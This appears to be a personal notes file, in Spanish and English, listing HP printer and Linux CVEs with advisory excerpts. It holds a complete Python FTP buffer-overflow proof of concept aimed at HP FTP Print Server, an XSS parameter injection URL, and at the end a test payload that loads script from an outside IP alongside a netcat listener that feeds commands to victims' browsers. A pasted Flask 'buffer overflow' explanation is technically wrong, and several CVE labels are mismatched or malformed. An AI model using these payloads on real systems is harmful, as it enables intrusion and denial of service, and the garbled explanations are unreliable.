
## CVE-2022-48311

https://github.com/swzhouu/CVE-2022-48311

*UNSUPPORTED WHEN ASSIGNED* Cross Site Scripting (XSS) in HP Deskjet 2540 series printer Firmware Version CEP1FN1418BR and Product Model Number A9U23B allows authenticated attacker to inject their own script into the page via HTTP configuration page.

Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

## CVE-2022-0847

Desde el 7 de marzo, se ha hecho público el bug con **código CVE-2022-0847**, también apodado **Dirty Pipe**. **Esta vulnerabilidad afecta inicialmente al kernel de Linux** a partir de la versión 5.8 y permite escalar privilegios escribiendo en archivos bloqueados para solo lectura. Muchos sistemas, entre ellos las últimas versiones de Android y algunas distribuciones como Ubuntu, Debian o Fedora están afectadas.

https://www.tarlogic.com/es/blog/vulnerabilidad-dirty-pipe-cve-2022-0847/


# CVE-2022-24291

Certain HP Print devices may be vulnerable to potential information disclosure, denial of service, or remote code execution.


https://www.exploit-db.com/exploits/29297


# CVE-2004-1856

HP Web Jetadmin es propenso a un problema que puede permitir a usuarios remotos cargar archivos arbitrarios en el servidor de gestión.   Este problema existe en el script de actualización del firmware de la impresora. Dada la capacidad de colocar archivos arbitrarios en el servidor a una ubicación especificada por el atacante, puede ser posible ejecutar código arbitrario, aunque esto requerirá la explotación de otras vulnerabilidades conocidas, como BID 9972 "HP Web Jetadmin setinfo.hts Script Directory Traversal Vulnerability".  La autenticación, si se ha habilitado, sería necesaria para explotar este problema.  Este problema se ha detectado en la versión 7.5.2546 de HP Web Jetadmin en una plataforma Windows. Otras versiones pueden verse afectadas de forma similar. https://www.example.com:8443/plugins/hpjwja/script/devices_update_printer_fw_upload.hts

# CVE-2009-2684

Details

Multiple Linked Stored XSS vulnerabilities found in script support_param.html/config

Attacker can inject XSS in parameters "Product_URL" and "Tech_URL".

After applying support parameters configuration (parameter "Apply") script code will inject in support page (support.htm).

Example:

``http://[server]/support_param.html/config?Admin_Name=&Admin_Phone=&Product_URL=[XSS]&Tech_URL=[XSS]&Apply=Apply``


# CVE-2006-12-19

````
-HP Printers running FTP Print Server are prone to a buffer-overflow vulnerability. This issue occurs because the application fails to boundscheck user-supplied data before copying it into an insufficiently sized buffer. 

An attacker can exploit this issue to execute arbitrary code within the context of the affected application. Failed exploit attempts will result in a denial of service.

#!/usr/bin/python

import sys
from ftplib import FTP

print "Hewlett-Packard FTP Print Server Version 2.4.5 Buffer Overflow (POC)"
print "Copyright (c) Joxean Koret"
print

if len(sys.argv) == 1:
    print "Usage: %s <target>" % sys.argv[0]
    sys.exit(0)

target = sys.argv[1]

print "[+] Running attack against " + target

try:
    ftp = FTP(target)
except:
    print "[!] Can't connect to target", target, ".", sys.exc_info()[1]
    sys.exit(0)
try:
    msg = ftp.login() # Login anonymously
    print msg
except:
    print "[!] Error logging anonymously.",sys.exc_info()[1]
    sys.exit(0)

buf = "./A"
iMax = 9

for i in range(iMax):
    buf += buf

print "[+] Sending buffer of",len(buf[0:3000]),"byte(s) ... "

try:
    print "[+] Please, note that sometimes your connection will not be dropped. "
    ftp.retrlines("LIST " + buf[0:3000])
    print "[!] Exploit doesn't work :("
    print
    sys.exit(0)
except:
    print "[+] Apparently exploit works. Verifying ... "
    print sys.exc_info()[1]

ftp2 = FTP(target)

try:
    msg = ftp2.login()
    print "[!] No, it doesn't work :( "
    print
    print msg
    sys.exit(0)
except:
    print "[+] Yes, it works."
    print sys.exc_info()[1]
```
````

# CVE-2022-24293
HP ha emitido un boletín de seguridad advirtiendo de una vulnerabilidad de desbordamiento de búfer, rastreada como CVE-2022-3942 (puntuación CVSS 8,4), que podría conducir a la ejecución remota de código en dispositivos vulnerables.  

"_Ciertos productos de impresión y envío digital de HP pueden ser vulnerables a una potencial ejecución remota de código y desbordamiento de búfer con el uso de Link-Local Multicast Name Resolution o LLMNR"_ ,[_concluye_](https://support.hp.com/us-en/document/ish_5948778-5949142-16/hpsbpi03780) el _aviso._  

HP ya abordó el fallo con la publicación de actualizaciones de seguridad de firmware para la mayoría de los dispositivos afectados. HP también publicó mitigaciones para este problema, la compañía sugiere desactivar LLMNR (Link-Local Multicast Name Resolution).  

El gigante informático publicó un [boletín de seguridad](https://support.hp.com/us-en/document/ish_5950417-5950443-16/hpsbpi03781) separado sobre tres vulnerabilidades, dos calificadas como críticas (CVE-2022-24292 (puntuación de gravedad crítica: 9,8), y CVE-2022-24293 (puntuación de gravedad crítica: 9,8)) y una como de gravedad alta CVE-2022-24291 (puntuación de gravedad alta: 7,5).  

"_Ciertos dispositivos de impresión de HP pueden ser vulnerables a una potencial divulgación de información, denegación de servicio o ejecución remota de código", reza el_ [_boletín_](https://support.hp.com/us-en/document/ish_5950417-5950443-16/hpsbpi03781) _publicado por HP._  

Los defectos podrían ser explotados para la divulgación de información, obtener la ejecución remota de código, y desencadenar una denegación de servicio, respectivamente.  

HP ha solucionado todos los problemas mencionados con la publicación del [firmware de la impresora](https://support.hp.com/us-en/drivers) para algunos de los modelos afectados.

# CVE-2021-3942

Certain HP Print products and Digital Sending products may be vulnerable to potential remote code execution and buffer overflow with use of Link-Local Multicast Name Resolution or LLMNR.

Suppose we have a basic Python web application using the Flask framework:

pythonCopy code

`from flask import Flask, request  app = Flask(__name__)  @app.route('/process_input', methods=['POST']) def process_input():     user_input = request.form['input']     buffer_size = 100     buffer = ['\x00'] * buffer_size  # Initialize buffer with null bytes     # Copy user input into buffer     for i in range(min(len(user_input), buffer_size)):         buffer[i] = user_input[i]     # Process the input     # ...     return 'Input processed successfully.'  if __name__ == '__main__':     app.run(debug=True)`

In this example, we have a route `/process_input` that accepts POST requests containing user input in a form field called `'input'`. The input is then copied into a buffer of size 100.

However, there's a vulnerability here. If the length of the user input exceeds the buffer size, a buffer overflow can occur. Let's say a malicious user sends a POST request with a very long input:

pythonCopy code

`import requests  malicious_input = 'A' * 150 response = requests.post('http://localhost:5000/process_input', data={'input': malicious_input}) print(response.text)`

When this request is sent to the `/process_input` endpoint, the server will attempt to copy all 150 characters of the input into the 100-byte buffer. This causes a buffer overflow.

To mitigate this vulnerability, you can enforce a maximum input length or use safer constructs like Python's slicing to ensure that only a portion of the input is copied into the buffer:

pythonCopy code

`buffer = user_input[:buffer_size]`

Additionally, using frameworks or libraries with built-in protections against buffer overflows, such as Django's form handling, can help prevent such vulnerabilities.

web buffer overflow example and explain with python

# PRUEBA 1
``Víctima:

<script>setInterval(function(){d=document;z=d.createElement("script");z.src="//192.168.78.129:1337";d.body.appendChild(z)},0)</script>

Atacante:

while :; do printf "@x11>$ "; read c; echo $c | nc -vvlp 1337 >/dev/null; done


